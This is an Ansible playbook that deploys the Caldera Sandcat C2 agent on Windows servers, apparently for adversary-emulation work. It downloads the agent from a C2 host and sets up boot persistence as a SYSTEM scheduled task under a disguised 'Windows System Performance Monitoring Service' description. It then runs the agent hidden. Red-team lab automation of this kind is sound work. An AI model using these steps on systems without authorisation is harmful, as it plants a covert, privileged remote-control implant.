---
# Deploys the Caldera Sandcat agent on Windows Server 2022
# Sandcat is pulled directly from the running Caldera server — no pre-staging needed.

- name: "[Caldera/Windows] Download Sandcat binary from Caldera server"
  win_shell: |
    $headers = @{
        "file"     = "sandcat.go-windows"
        "platform" = "windows"
    }
    Invoke-WebRequest `
        -Uri "http://{{ caldera_c2_ip }}:{{ caldera_c2_port }}/file/download" `
        -Headers $headers `
        -OutFile "{{ caldera_windows_bin_path }}"

- name: "[Caldera/Windows] Create Scheduled Task for persistence"
  win_scheduled_task:
    name:        "{{ caldera_windows_task_name }}"
    description: "Windows System Performance Monitoring Service"
    actions:
      - path: "{{ caldera_windows_bin_path }}"
        arguments: "-server http://{{ caldera_c2_ip }}:{{ caldera_c2_port }} -group {{ caldera_group }} -v"
    triggers:
      - type: boot
    run_level:   highest
    logon_type:  service_account
    username:    SYSTEM
    state:       present
    enabled:     true

- name: "[Caldera/Windows] Start agent process if not running"
  win_shell: |
    if (-not (Get-Process -Name "{{ caldera_windows_process_name }}" -ErrorAction SilentlyContinue)) {
        Start-Process `
            -FilePath "{{ caldera_windows_bin_path }}" `
            -ArgumentList "-server http://{{ caldera_c2_ip }}:{{ caldera_c2_port }} -group {{ caldera_group }} -v" `
            -WindowStyle Hidden
    }

- name: "[Caldera/Windows] Verify process is running"
  win_shell: |
    (Get-Process -Name "{{ caldera_windows_process_name }}" -ErrorAction SilentlyContinue) -ne $null
  register: caldera_proc_state
  changed_when: false

- name: "[Caldera/Windows] Print process state"
  debug:
    msg: "Caldera process running on {{ inventory_hostname }}: {{ caldera_proc_state.stdout | trim }}"
